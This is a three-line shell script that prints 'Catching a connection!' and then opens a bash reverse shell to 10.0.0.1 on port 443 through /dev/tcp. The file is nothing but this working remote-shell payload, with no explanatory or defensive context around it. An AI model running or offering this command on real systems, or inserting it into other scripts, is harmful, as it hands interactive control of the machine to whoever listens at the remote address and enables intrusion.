#!/bin/sh


echo "Catching a connection!"

bash -i >& /dev/tcp/10.0.0.1/443 0>&1
